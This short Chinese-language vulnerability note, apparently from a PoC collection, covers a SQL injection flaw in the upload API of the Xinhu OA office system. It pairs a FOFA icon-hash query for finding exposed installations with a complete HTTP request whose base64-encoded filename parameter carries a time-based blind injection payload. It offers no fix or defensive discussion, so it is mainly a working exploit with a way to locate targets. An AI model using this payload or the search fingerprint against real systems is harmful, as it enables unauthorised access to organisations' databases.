# 信呼OA办公系统后台uploadAction存在SQL注入

信呼OA办公系统是一个开源的在线办公系统。 信呼OA办公系统uploadAction存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

## fofa

```java
icon_hash="1652488516"
```

## poc

```javascript
GET /xhoa/api.php?a=getmfilv&m=upload|api&d=task&fileid=1&fname=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1  
Host:  
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"  
Sec-Fetch-Dest: empty  
Accept: application/json, text/javascript, */*; q=0.01  
Referer: http://127.0.0.1:81/xhoa/  
Cookie:   
Sec-Fetch-Mode: cors  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36  
Accept-Encoding: gzip, deflate, br, zstd  
Sec-Fetch-Site: same-origin  
Accept-Language: zh-CN,zh;q=0.9  
X-Requested-With: XMLHttpRequest  
sec-ch-ua-mobile: ?0  
sec-ch-ua-platform: "Windows"  
```

![image-20241128092859877](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280928931.png)



## 漏洞来源

- https://forum.butian.net/article/613